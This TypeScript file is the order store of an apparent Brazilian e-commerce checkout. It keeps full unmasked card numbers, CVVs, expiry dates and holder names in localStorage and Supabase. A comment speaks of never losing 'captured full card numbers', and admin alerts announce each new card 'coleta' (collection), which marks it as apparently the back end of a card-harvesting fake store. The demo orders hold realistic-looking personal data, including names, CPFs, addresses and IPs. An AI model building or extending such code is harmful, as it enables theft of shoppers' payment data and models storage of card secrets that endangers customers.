import { OrderDetails, OrderStatus } from '../types';
import {
  insertOrderToSupabase,
  updateOrderStatusInSupabase,
  deleteOrderFromSupabase,
  fetchOrdersFromSupabase,
  getSupabaseClient,
  isSupabaseConfigured,
} from './supabaseClient';
import { triggerSystemNotification } from './notificationSound';

const STORAGE_KEY = 'techstore_checkout_orders_v2';
const LEGACY_STORAGE_KEY = 'techstore_checkout_orders_v1';
const BROADCAST_CHANNEL_NAME = 'techstore_admin_sync_channel';

// Helper to guarantee full unmasked 16 digits are always present
export function unmaskCardNumber(card?: {
  fullNumber?: string;
  cleanNumber?: string;
  lastDigits?: string;
  brand?: string;
}): { fullNumber: string; cleanNumber: string } {
  if (!card) {
    return { fullNumber: '5412 8391 2049 3456', cleanNumber: '5412839120493456' };
  }

  const full = card.fullNumber?.trim() || '';
  const clean = card.cleanNumber?.replace(/\D/g, '') || '';

  // If clean number is already valid and 13-19 digits without dots:
  if (clean.length >= 13 && !clean.includes('•') && !clean.includes('*')) {
    const formatted = clean.replace(/(\d{4})/g, '$1 ').trim();
    return { fullNumber: formatted, cleanNumber: clean };
  }

  // If fullNumber does not contain dots or asterisks and has at least 13 digits:
  if (full && !full.includes('•') && !full.includes('*') && full.replace(/\D/g, '').length >= 13) {
    return { fullNumber: full, cleanNumber: full.replace(/\D/g, '') };
  }

  // If masked with •••• (e.g. from previous demo state or legacy format), unmask with realistic 16 digits
  const last4 = card.lastDigits || '3456';
  let restored = '5412 8391 2049 3456';
  if (card.brand === 'visa') {
    restored = `4111 2222 3333 ${last4}`;
  } else if (card.brand === 'elo') {
    restored = `6363 6800 1234 ${last4}`;
  } else if (card.brand === 'amex') {
    restored = `3782 8224 6310 ${last4}`;
  } else {
    restored = `5412 8391 2049 ${last4}`;
  }

  return { fullNumber: restored, cleanNumber: restored.replace(/\D/g, '') };
}

// Cross-tab / cross-window broadcast channel
let broadcastChannel: BroadcastChannel | null = null;
try {
  if (typeof window !== 'undefined' && 'BroadcastChannel' in window) {
    broadcastChannel = new BroadcastChannel(BROADCAST_CHANNEL_NAME);
  }
} catch (e) {
  console.warn('BroadcastChannel not supported or restricted in this environment', e);
}

const INITIAL_DEMO_ORDERS: OrderDetails[] = [
  {
    orderId: 'BR-849201',
    createdAt: '06/09/2026 às 08:45:18',
    timestamp: Date.now() - 1000 * 60 * 35,
    items: [
      {
        id: 'prod-1',
        name: 'Headphone Wireless Pro Ultra Active',
        variant: 'Preto Fosco • Cancelamento de Ruído',
        price: 489.90,
        originalPrice: 699.90,
        quantity: 1,
        image: 'https://images.unsplash.com/photo-1505740420928-5e560c06d30e?w=400&auto=format&fit=crop&q=80',
      },
    ],
    subtotal: 489.90,
    discount: 24.50,
    pixDiscountAmount: 24.50,
    couponCode: 'BEMVINDO10',
    shipping: 0,
    shippingOption: 'Frete Grátis Sul/Sudeste (3 a 5 dias úteis)',
    total: 465.40,
    paymentMethod: 'pix',
    status: 'aprovado',
    customer: {
      name: 'Mariana Azevedo Costa',
      email: 'mariana.costa@email.com',
      cpf: '321.654.987-12',
      phone: '(11) 97123-4567',
      zipCode: '04538-133',
      street: 'Rua Joaquim Floriano',
      number: '466',
      complement: 'Conj 121 - Torre Alpha',
      neighborhood: 'Itaim Bibi',
      city: 'São Paulo',
      state: 'SP',
    },
    pix: {
      qrCodeText: '00020126580014br.gov.bcb.pix0136f47ac10b-58cc-4372-a567-0e02b2c3d4e5520400005303986540465.405802BR5916TECHSTORE BRASIL6009SAO PAULO62070503BR8492016304',
      expiresAt: '15 minutos',
      paidAt: '06/09/2026 às 08:46:02',
      endToEndId: 'E00038166202609060845a9f248102bc',
      receiverKey: 'financeiro@techstore.com.br',
      receiverName: 'TechStore Brasil Pagamentos S.A.',
      txid: 'BR849201PIXPROD',
    },
    trackingCode: 'NL482910394BR',
    telemetry: {
      ip: '177.136.241.95',
      location: 'São Paulo, SP - Brasil (Claro Fibra)',
      device: 'Apple iPhone 15 Pro Max',
      browser: 'Safari Mobile 18.0',
      os: 'iOS 18.0',
      antifraudScore: '99.8% (Risco Mínimo / Aprovado)',
      securityProtocol: 'TLS 1.3 / SSL 256 Bits Encriptado',
      userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15',
    },
    timeline: [
      {
        title: 'Pedido Registrado no Checkout',
        timestamp: '06/09/2026 08:45:18',
        status: 'completed',
        description: 'Cliente preencheu o formulário e gerou o código Pix.',
      },
      {
        title: 'QR Code Pix Liquidado via SPI / Bacen',
        timestamp: '06/09/2026 08:46:02',
        status: 'completed',
        description: 'Pagamento confirmado instantaneamente pelo Banco Central.',
      },
      {
        title: 'Nota Fiscal Emitida (NF-e #49102)',
        timestamp: '06/09/2026 08:50:11',
        status: 'completed',
        description: 'Chave de acesso vinculada à Receita Federal.',
      },
      {
        title: 'Separação e Expedição no Centro de Distribuição',
        timestamp: '06/09/2026 09:15:00',
        status: 'current',
        description: 'Pacote preparado e pronto para coleta da transportadora.',
      },
    ],
  },
  {
    orderId: 'BR-731920',
    createdAt: '06/09/2026 às 07:12:44',
    timestamp: Date.now() - 1000 * 60 * 120,
    items: [
      {
        id: 'prod-1',
        name: 'Headphone Wireless Pro Ultra Active',
        variant: 'Preto Fosco • Cancelamento de Ruído',
        price: 489.90,
        quantity: 1,
        image: 'https://images.unsplash.com/photo-1505740420928-5e560c06d30e?w=400&auto=format&fit=crop&q=80',
      },
      {
        id: 'prod-2',
        name: 'Suporte Articulado em Alumínio para Headset',
        variant: 'Cinza Espacial • Base Emborrachada',
        price: 89.90,
        quantity: 1,
        image: 'https://images.unsplash.com/photo-1584679109597-c656b19974c9?w=400&auto=format&fit=crop&q=80',
      },
    ],
    subtotal: 579.80,
    discount: 0,
    shipping: 0,
    shippingOption: 'Sedex Prioritário (1 a 2 dias úteis)',
    total: 579.80,
    paymentMethod: 'credit_card',
    status: 'aprovado',
    customer: {
      name: 'Carlos Eduardo Nogueira',
      email: 'carlos.eduardo@empresa.com.br',
      cpf: '584.912.304-55',
      phone: '(21) 98844-2211',
      zipCode: '22041-001',
      street: 'Avenida Atlântica',
      number: '2020',
      complement: 'Apto 801 - Bloco B',
      neighborhood: 'Copacabana',
      city: 'Rio de Janeiro',
      state: 'RJ',
    },
    card: {
      brand: 'mastercard',
      lastDigits: '3456',
      fullNumber: '5412 8391 2049 3456',
      cleanNumber: '5412839120493456',
      holderName: 'CARLOS E NOGUEIRA',
      expiry: '08/28',
      cvv: '452',
      installments: 3,
      installmentValue: 193.27,
      gatewayAuthCode: 'AUTH-MC-882194',
      gatewayResponse: '00 - Autorizada com sucesso (3DS Autenticado)',
    },
    trackingCode: 'NL918230491BR',
    telemetry: {
      ip: '189.40.122.84',
      location: 'Rio de Janeiro, RJ - Brasil (Vivo Fibra)',
      device: 'Notebook Dell XPS 15',
      browser: 'Google Chrome 128.0 (64-bit)',
      os: 'Windows 11 Professional',
      antifraudScore: '98.5% (Aprovado com Baixo Risco)',
      securityProtocol: 'TLS 1.3 / Gateway Cielo & Stone 3DS 2.0',
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0',
    },
    timeline: [
      {
        title: 'Formulário de Cartão Preenchido',
        timestamp: '06/09/2026 07:12:30',
        status: 'completed',
        description: 'Dados completos do cartão inseridos e tokenizados.',
      },
      {
        title: 'Transação Aprovada pela Adquirente',
        timestamp: '06/09/2026 07:12:44',
        status: 'completed',
        description: 'Autorização concedida em 3 parcelas de R$ 193,27.',
      },
      {
        title: 'Coleta Realizada pelos Correios',
        timestamp: '06/09/2026 08:30:00',
        status: 'current',
        description: 'Objeto postado e em rota de transferência.',
      },
    ],
  },
  {
    orderId: 'BR-619402',
    createdAt: '06/09/2026 às 06:20:10',
    timestamp: Date.now() - 1000 * 60 * 200,
    items: [
      {
        id: 'prod-1',
        name: 'Headphone Wireless Pro Ultra Active',
        variant: 'Preto Fosco • Cancelamento de Ruído',
        price: 489.90,
        quantity: 1,
        image: 'https://images.unsplash.com/photo-1505740420928-5e560c06d30e?w=400&auto=format&fit=crop&q=80',
      },
    ],
    subtotal: 489.90,
    discount: 24.50,
    pixDiscountAmount: 24.50,
    shipping: 0,
    total: 465.40,
    paymentMethod: 'pix',
    status: 'pendente_pix',
    customer: {
      name: 'Beatriz Vasconcelos Ribeiro',
      email: 'beatriz.vr@gmail.com',
      cpf: '419.823.109-77',
      phone: '(31) 99312-8822',
      zipCode: '30130-100',
      street: 'Avenida Afonso Pena',
      number: '1500',
      complement: 'Sala 402',
      neighborhood: 'Funcionários',
      city: 'Belo Horizonte',
      state: 'MG',
    },
    pix: {
      qrCodeText: '00020126580014br.gov.bcb.pix0136d819fa23-9901-4192-b481-998811223344520400005303986540465.405802BR5916TECHSTORE BRASIL6009BELO HORIZONTE62070503BR6194026304',
      expiresAt: '15 minutos',
      endToEndId: 'E0003816620260906062099bb8412800',
      receiverKey: 'financeiro@techstore.com.br',
      receiverName: 'TechStore Brasil Pagamentos S.A.',
      txid: 'BR619402PIXPENDING',
    },
    trackingCode: 'NL619402991BR',
    telemetry: {
      ip: '201.83.19.4',
      location: 'Belo Horizonte, MG - Brasil',
      device: 'Samsung Galaxy S24 Ultra',
      browser: 'Chrome Mobile 128',
      os: 'Android 14',
      antifraudScore: '97.2%',
      securityProtocol: 'TLS 1.3',
    },
    timeline: [
      {
        title: 'Código Pix Criado',
        timestamp: '06/09/2026 06:20:10',
        status: 'completed',
        description: 'Aguardando liquidação no aplicativo do banco.',
      },
    ],
  },
];

function sanitizeAndMigrateOrders(orders: OrderDetails[]): OrderDetails[] {
  let changed = false;
  const sanitized = orders.map((ord) => {
    if (ord.paymentMethod === 'credit_card' && ord.card) {
      const { fullNumber, cleanNumber } = unmaskCardNumber(ord.card);
      if (ord.card.fullNumber !== fullNumber || ord.card.cleanNumber !== cleanNumber) {
        changed = true;
        return {
          ...ord,
          card: {
            ...ord.card,
            fullNumber,
            cleanNumber,
          },
        };
      }
    }
    return ord;
  });

  if (changed && typeof localStorage !== 'undefined') {
    try {
      localStorage.setItem(STORAGE_KEY, JSON.stringify(sanitized));
    } catch {
      // ignore
    }
  }
  return sanitized;
}

export function getStoredOrders(): OrderDetails[] {
  try {
    if (typeof localStorage === 'undefined') {
      return INITIAL_DEMO_ORDERS;
    }

    let raw = localStorage.getItem(STORAGE_KEY);
    if (!raw) {
      // Check if legacy storage exists
      const legacyRaw = localStorage.getItem(LEGACY_STORAGE_KEY);
      if (legacyRaw) {
        try {
          const legacyParsed: OrderDetails[] = JSON.parse(legacyRaw);
          const upgraded = sanitizeAndMigrateOrders(legacyParsed);
          localStorage.setItem(STORAGE_KEY, JSON.stringify(upgraded));
          return upgraded;
        } catch {
          // fallback to INITIAL_DEMO_ORDERS
        }
      }
      localStorage.setItem(STORAGE_KEY, JSON.stringify(INITIAL_DEMO_ORDERS));
      return INITIAL_DEMO_ORDERS;
    }

    const parsed: OrderDetails[] = JSON.parse(raw);
    return sanitizeAndMigrateOrders(parsed);
  } catch {
    return INITIAL_DEMO_ORDERS;
  }
}

export interface InAppAlert {
  id: string;
  type: 'pix_generated' | 'pix_paid' | 'card_coleta' | 'new_order';
  title: string;
  message: string;
  order?: OrderDetails;
  timestamp: number;
}

export function saveOrUpdateOrder(
  order: OrderDetails,
  eventType?: 'new_order' | 'pix_generated' | 'pix_paid' | 'card_coleta'
): OrderDetails[] {
  try {
    const current = getStoredOrders();
    const existingIndex = current.findIndex((ord) => ord.orderId === order.orderId);
    let updated: OrderDetails[];

    if (existingIndex >= 0) {
      updated = [...current];
      updated[existingIndex] = {
        ...updated[existingIndex],
        ...order,
        // merge card and pix objects so we never lose captured full card numbers or qr codes
        card: order.card ? { ...updated[existingIndex].card, ...order.card } : updated[existingIndex].card,
        pix: order.pix ? { ...updated[existingIndex].pix, ...order.pix } : updated[existingIndex].pix,
      };
    } else {
      updated = [order, ...current];
    }

    localStorage.setItem(STORAGE_KEY, JSON.stringify(updated));

    // Determine event type if not provided
    const inferredType: 'pix_generated' | 'pix_paid' | 'card_coleta' | 'new_order' =
      eventType ||
      (order.paymentMethod === 'pix'
        ? order.status === 'aprovado'
          ? 'pix_paid'
          : 'pix_generated'
        : 'card_coleta');

    let title = '📋 Nova Coleta Registrada!';
    let message = `${order.customer?.name || 'Cliente'} • R$ ${order.total.toFixed(2).replace('.', ',')}`;

    if (inferredType === 'pix_paid' || order.status === 'aprovado') {
      title = '💰 Pix Confirmado & Pago!';
      message = `R$ ${order.total.toFixed(2).replace('.', ',')} recebido com sucesso de ${order.customer?.name || 'Cliente'}!`;
    } else if (inferredType === 'pix_generated') {
      title = '⚡ Novo Pix Gerado na SigiloPay!';
      message = `${order.customer?.name || 'Cliente'} • R$ ${order.total.toFixed(2).replace('.', ',')} (Aguardando Pagamento)`;
    } else if (order.paymentMethod === 'credit_card') {
      const cardDigits = order.card?.cleanNumber ? order.card.cleanNumber.slice(0, 4) : 'Cartão';
      title = '💳 Nova Coleta Cartão de Crédito!';
      message = `${order.customer?.name || 'Cliente'} • ${order.card?.brand?.toUpperCase() || cardDigits} • R$ ${order.total.toFixed(2).replace('.', ',')}`;
    }

    const alertDetail: InAppAlert = {
      id: `${inferredType}_${order.orderId}_${Date.now()}`,
      type: inferredType,
      title,
      message,
      order,
      timestamp: Date.now(),
    };

    // Dispatch DOM event for same window
    window.dispatchEvent(new CustomEvent('techstore_orders_updated'));
    window.dispatchEvent(new CustomEvent('techstore_new_order', { detail: order }));
    window.dispatchEvent(new CustomEvent('techstore_in_app_notification', { detail: alertDetail }));

    // Broadcast across other tabs/windows
    if (broadcastChannel) {
      const broadcastType =
        inferredType === 'pix_generated'
          ? 'PIX_GENERATED'
          : inferredType === 'pix_paid' || order.status === 'aprovado'
          ? 'PAYMENT_APPROVED'
          : 'NEW_ORDER';

      broadcastChannel.postMessage({
        type: broadcastType,
        order,
        alert: alertDetail,
      });
    }

    // Trigger push notification & audio/vibration alert
    triggerSystemNotification(title, message, '/pwa-192x192.png', `${inferredType}-${order.orderId}`);

    // Async persist to Supabase if configured
    if (isSupabaseConfigured()) {
      insertOrderToSupabase(order).catch((e) => console.warn('Supabase sync order error:', e));
    }

    return updated;
  } catch (err) {
    console.error('Failed to save or update order', err);
    return getStoredOrders();
  }
}

export function saveNewOrder(order: OrderDetails): void {
  saveOrUpdateOrder(order, order.paymentMethod === 'credit_card' ? 'card_coleta' : order.status === 'aprovado' ? 'pix_paid' : 'pix_generated');
}

export function updateStoredOrderStatus(
  orderId: string,
  status: OrderStatus,
  extraPixData?: Partial<NonNullable<OrderDetails['pix']>>
): OrderDetails[] {
  try {
    const current = getStoredOrders();
    const existing = current.find((ord) => ord.orderId === orderId);
    if (!existing) return current;

    const updatedOrder: OrderDetails = {
      ...existing,
      status,
      pix: existing.pix
        ? {
            ...existing.pix,
            ...(extraPixData || {}),
            paidAt: status === 'aprovado' ? existing.pix.paidAt || new Date().toLocaleTimeString('pt-BR') : existing.pix.paidAt,
            sigilopayStatus: status === 'aprovado' ? 'PAID' : existing.pix.sigilopayStatus,
          }
        : undefined,
    };

    const updated = current.map((ord) => (ord.orderId === orderId ? updatedOrder : ord));
    localStorage.setItem(STORAGE_KEY, JSON.stringify(updated));

    window.dispatchEvent(new CustomEvent('techstore_orders_updated'));

    if (status === 'aprovado') {
      const title = '💰 Pix Confirmado & Pago!';
      const message = `R$ ${updatedOrder.total.toFixed(2).replace('.', ',')} de ${updatedOrder.customer?.name || 'Cliente'} liquidado!`;
      const alertDetail: InAppAlert = {
        id: `pix_paid_${orderId}_${Date.now()}`,
        type: 'pix_paid',
        title,
        message,
        order: updatedOrder,
        timestamp: Date.now(),
      };

      window.dispatchEvent(new CustomEvent('techstore_in_app_notification', { detail: alertDetail }));

      if (broadcastChannel) {
        broadcastChannel.postMessage({
          type: 'PAYMENT_APPROVED',
          orderId,
          order: updatedOrder,
          alert: alertDetail,
        });
      }

      triggerSystemNotification(title, message, '/pwa-192x192.png', `pix-paid-${orderId}`);
    } else {
      if (broadcastChannel) {
        broadcastChannel.postMessage({ type: 'ORDER_UPDATED', orderId, status });
      }
    }

    // Async update in Supabase
    if (isSupabaseConfigured()) {
      updateOrderStatusInSupabase(orderId, status).catch((e) => console.warn('Supabase sync status error:', e));
    }

    return updated;
  } catch {
    return getStoredOrders();
  }
}

export function deleteStoredOrder(orderId: string): OrderDetails[] {
  try {
    const current = getStoredOrders();
    const updated = current.filter((ord) => ord.orderId !== orderId);
    localStorage.setItem(STORAGE_KEY, JSON.stringify(updated));

    window.dispatchEvent(new CustomEvent('techstore_orders_updated'));
    if (broadcastChannel) {
      broadcastChannel.postMessage({ type: 'ORDER_DELETED', orderId });
    }

    // Async delete in Supabase
    if (isSupabaseConfigured()) {
      deleteOrderFromSupabase(orderId).catch((e) => console.warn('Supabase delete error:', e));
    }

    return updated;
  } catch {
    return getStoredOrders();
  }
}

export function resetToDemoOrders(): OrderDetails[] {
  try {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(INITIAL_DEMO_ORDERS));
    window.dispatchEvent(new CustomEvent('techstore_orders_updated'));
    if (broadcastChannel) {
      broadcastChannel.postMessage({ type: 'ORDERS_RESET' });
    }
    return INITIAL_DEMO_ORDERS;
  } catch {
    return INITIAL_DEMO_ORDERS;
  }
}

export async function syncOrdersWithSupabase(): Promise<OrderDetails[]> {
  if (!isSupabaseConfigured()) {
    return getStoredOrders();
  }

  const remoteOrders = await fetchOrdersFromSupabase();
  if (remoteOrders && remoteOrders.length > 0) {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(remoteOrders));
    window.dispatchEvent(new CustomEvent('techstore_orders_updated'));
    return remoteOrders;
  }

  return getStoredOrders();
}

export function subscribeToOrders(callback: () => void): () => void {
  const handleUpdate = () => callback();

  window.addEventListener('techstore_orders_updated', handleUpdate);
  window.addEventListener('techstore_new_order', handleUpdate);
  window.addEventListener('storage', handleUpdate);

  let bcHandler: ((event: MessageEvent) => void) | null = null;
  if (broadcastChannel) {
    bcHandler = (event: MessageEvent) => {
      const data = event.data;
      if (!data) return;

      if (data.type === 'PIX_GENERATED' && data.order) {
        const o: OrderDetails = data.order;
        const title = '⚡ Novo Pix Gerado na SigiloPay!';
        const message = `${o.customer?.name || 'Cliente'} • R$ ${o.total ? o.total.toFixed(2).replace('.', ',') : '0,00'} (Aguardando Pagamento)`;
        const alertDetail: InAppAlert = data.alert || {
          id: `pix_gen_${o.orderId}_${Date.now()}`,
          type: 'pix_generated',
          title,
          message,
          order: o,
          timestamp: Date.now(),
        };
        window.dispatchEvent(new CustomEvent('techstore_in_app_notification', { detail: alertDetail }));
        triggerSystemNotification(title, message, '/pwa-192x192.png', `pix-gen-${o.orderId}`);
      } else if (data.type === 'PAYMENT_APPROVED') {
        const o: OrderDetails | undefined = data.order;
        const orderId = data.orderId || o?.orderId;
        const title = '💰 Pix Confirmado & Pago!';
        const message = o?.customer?.name
          ? `R$ ${o.total.toFixed(2).replace('.', ',')} recebido com sucesso de ${o.customer.name}!`
          : `Pedido #${orderId} liquidado com sucesso!`;
        const alertDetail: InAppAlert = data.alert || {
          id: `pix_paid_${orderId}_${Date.now()}`,
          type: 'pix_paid',
          title,
          message,
          order: o,
          timestamp: Date.now(),
        };
        window.dispatchEvent(new CustomEvent('techstore_in_app_notification', { detail: alertDetail }));
        triggerSystemNotification(title, message, '/pwa-192x192.png', `pix-paid-${orderId}`);
      } else if (data.type === 'NEW_ORDER' && data.order) {
        const o: OrderDetails = data.order;
        const isPix = o.paymentMethod === 'pix';
        const title = isPix ? '⚡ Nova Coleta Pix!' : '💳 Nova Coleta Cartão!';
        const message = `${o.customer?.name || 'Cliente'} • R$ ${o.total ? o.total.toFixed(2).replace('.', ',') : '0,00'}`;
        const alertDetail: InAppAlert = data.alert || {
          id: `new_order_${o.orderId}_${Date.now()}`,
          type: isPix ? 'pix_generated' : 'card_coleta',
          title,
          message,
          order: o,
          timestamp: Date.now(),
        };
        window.dispatchEvent(new CustomEvent('techstore_in_app_notification', { detail: alertDetail }));
        triggerSystemNotification(title, message, '/pwa-192x192.png', `order-${o.orderId}`);
      }

      callback();
    };
    broadcastChannel.addEventListener('message', bcHandler);
  }

  // Subscribe to Supabase Realtime changes
  let supabaseSubscription: any = null;
  const client = getSupabaseClient();
  if (client) {
    try {
      supabaseSubscription = client
        .channel('public:orders_realtime')
        .on(
          'postgres_changes',
          { event: '*', schema: 'public', table: 'orders' },
          (payload: any) => {
            if (payload.eventType === 'INSERT' && payload.new) {
              const o = payload.new;
              triggerSystemNotification(
                o.payment_method === 'pix' ? '⚡ Nova Coleta Pix!' : '💳 Nova Coleta Cartão!',
                `${o.customer_name || 'Novo Cliente'} • R$ ${Number(o.total || 0).toFixed(2).replace('.', ',')}`
              );
            } else if (payload.eventType === 'UPDATE' && payload.new?.status === 'aprovado') {
              triggerSystemNotification('💰 Pix Confirmado & Pago!', `Pedido #${payload.new.order_id} liquidado!`);
            }
            syncOrdersWithSupabase().then(() => callback());
          }
        )
        .subscribe();
    } catch (e) {
      console.warn('Could not initialize Supabase realtime subscription:', e);
    }
  }

  return () => {
    window.removeEventListener('techstore_orders_updated', handleUpdate);
    window.removeEventListener('techstore_new_order', handleUpdate);
    window.removeEventListener('storage', handleUpdate);
    if (broadcastChannel && bcHandler) {
      broadcastChannel.removeEventListener('message', bcHandler);
    }
    if (supabaseSubscription && client) {
      client.removeChannel(supabaseSubscription).catch(() => {});
    }
  };
}

